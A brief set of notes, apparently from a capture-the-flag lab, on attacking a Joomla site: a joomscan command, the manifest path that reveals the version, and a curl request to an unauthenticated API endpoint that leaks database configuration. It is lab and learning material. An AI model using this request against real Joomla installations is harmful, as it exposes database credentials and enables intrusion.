joomscan

```
joomscan -u http://[address]
```

administrator/manifests/files/joomla.xml

send a GET request to the /api/index.php/v1/config/application? public=true endpoint, potentially gaining access to sensitive data and all the configuration data of the database.

curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true -vv